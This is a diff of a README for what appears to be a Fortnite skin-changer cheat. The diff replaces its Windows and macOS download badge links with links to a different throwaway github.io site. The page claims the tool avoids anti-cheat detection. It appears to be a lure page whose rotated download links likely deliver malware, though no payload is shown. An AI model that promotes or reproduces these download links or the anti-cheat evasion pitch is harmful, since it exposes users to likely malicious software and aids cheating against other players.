@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
@@ -58,9 +58,9 @@ Works because it never touches anything anti-cheat monitors.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 </div>
 
@@ -77,7 +77,7 @@ Works because it never touches anything anti-cheat monitors.
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
